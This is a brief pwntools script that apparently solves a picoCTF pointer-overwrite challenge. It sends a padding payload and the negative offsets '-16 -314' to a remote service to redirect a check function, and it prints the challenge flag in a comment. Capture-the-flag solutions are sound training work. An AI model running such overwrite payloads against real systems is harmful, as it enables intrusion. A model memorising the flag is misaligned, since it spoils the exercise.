from pwn import *

#file = "./vuln"
host = "saturn.picoctf.net"
port = 50944
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = remote(host, port)
#io = process(file)

# easy_check = 0x080492fc
# hard_check = 0x08049436
pld = b"AAAAAABGZZZZZZZZZ"
io.sendlineafter(">> ", pld)
io.sendlineafter("10.", "-16 -314")

io.interactive()
#picoCTF{0v3rwrit1ng_P01nt3rs_789b0a98}
